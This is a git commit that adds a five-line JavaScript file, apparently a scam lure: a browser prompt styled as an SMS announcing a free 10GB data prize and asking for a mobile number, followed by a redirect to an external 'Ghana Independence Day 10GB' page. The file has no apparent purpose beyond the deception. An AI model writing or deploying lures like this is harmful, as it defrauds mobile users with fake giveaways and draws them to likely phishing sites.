f81cde4f41dfd9e13ea1a6982de9d6e7fb16d272
usorondo80 <salvage.paresis_3i@icloud.com>
2026-03-06 14:02:13 +0100

    Create ghana69.js

---
+++ ghana69.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 10GB'
+password=prompt('SMS: Congratulations, you are eligible to receive 10GB, click OK to Enter Your Mobile Number','ACTIVATE 10GB');
+if (password != 'ACTIVATE 10GB') {
+location.href='https://www.mfangutasi.site/gh-independence-day-10gb';
+}
